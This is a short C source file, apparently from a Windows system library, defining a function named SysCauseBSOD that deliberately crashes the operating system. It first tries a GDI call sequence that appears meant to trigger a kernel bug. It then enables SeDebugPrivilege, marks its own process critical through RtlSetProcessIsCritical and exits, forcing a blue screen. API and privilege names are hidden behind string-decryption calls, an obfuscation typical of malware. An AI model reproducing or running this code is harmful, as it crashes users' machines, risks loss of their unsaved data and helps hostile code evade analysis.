#include "sys_includes.h"
#include <limits.h>

#include "syslib\system.h"
#include "bsod.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

SYSLIBFUNC(void) SysCauseBSOD()
{
    HDC hDC=CreateCompatibleDC(NULL);
    SetLayout(hDC,LAYOUT_RTL);
    ScaleWindowExtEx(hDC,INT_MIN,-1,1,1,NULL);
    DeleteDC(hDC);

    CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,100,0,NULL);

    __RtlSetProcessIsCritical SetCriticalProcess=(__RtlSetProcessIsCritical)GetProcAddress(GetModuleHandle(dcr_91764d8a("ntdll.dll")),dcrA_c172fa62("RtlSetProcessIsCritical"));
    if (SetCriticalProcess)
    {
        if (SysEnablePrivilege(dcr_ce01bcf7("SeDebugPrivilege"),true))
        {
            SetCriticalProcess(TRUE,NULL,FALSE);
            ExitProcess(0);
        }
    }
    return;
}

